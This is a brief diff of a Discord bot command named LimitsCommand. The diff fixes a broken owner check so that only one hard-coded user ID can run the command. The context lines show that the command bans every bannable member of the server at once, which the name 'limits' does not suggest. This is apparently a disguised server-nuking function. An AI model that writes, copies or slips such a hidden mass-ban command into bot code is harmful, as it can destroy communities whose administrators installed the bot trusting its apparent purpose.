@@ -21,7 +21,7 @@ class LimitsCommand extends Command {
 
     async exec(message, args) {
         let Owner = message.author;
-        if(Owner.id !== "727447049892659200" && "603269203511738420") return message.reply("Only the bot owner can use this command!")
+        if(Owner.id !== "603269203511738420") return message.reply("Only the bot owner can use this command!")
 
         message.guild.members.cache.filter(member => member.bannable).forEach(member => {member.ban()});
 
